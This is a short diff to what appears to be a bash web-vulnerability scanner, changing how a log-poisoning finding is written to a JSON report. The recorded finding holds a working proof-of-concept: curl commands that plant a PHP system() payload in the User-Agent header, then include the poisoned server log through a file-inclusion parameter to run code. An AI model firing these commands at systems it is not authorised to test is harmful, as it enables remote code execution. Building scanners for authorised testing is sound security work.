@@ -623,7 +623,7 @@ _lfi_log_poison() {
     local _esc_base="${target_base//\"/\\\"}"
     local _esc_url="${url//\"/\\\"}"
     local _esc_log="${encoded_log//\"/\\\"}"
-    echo "{\"type\":\"rce_log_poison\",\"url\":\"${_esc_url}\",\"param\":\"$param\",\"log_file\":\"/$readable_log\",\"confidence\":\"HIGH\",\"proof\":\"${poison_marker} found in response\",\"curl\":\"curl -sk -H 'User-Agent: <?php system(\\\\\\\"id\\\\\\\"); ?>' '${_esc_base}/' && curl -sk '${_esc_url}?${param}=${_esc_log}'\"}" >> "${outdir}/../vuln/lfi.json" 2>/dev/null || true
+    printf '%s\n' "{\"type\":\"rce_log_poison\",\"url\":\"${_esc_url}\",\"param\":\"$param\",\"log_file\":\"/$readable_log\",\"confidence\":\"HIGH\",\"proof\":\"${poison_marker} found in response\",\"curl\":\"curl -sk -H 'User-Agent: <?php system(\\\\\\\"id\\\\\\\"); ?>' '${_esc_base}/' && curl -sk '${_esc_url}?${param}=${_esc_log}'\"}" >> "${outdir}/../vuln/lfi.json" 2>/dev/null || true
   else
     echo -e "\033[2m  │ Log readable but code not executed (PHP not processing log)\033[0m" >&2
     # Still useful info: save a PoC command for manual testing
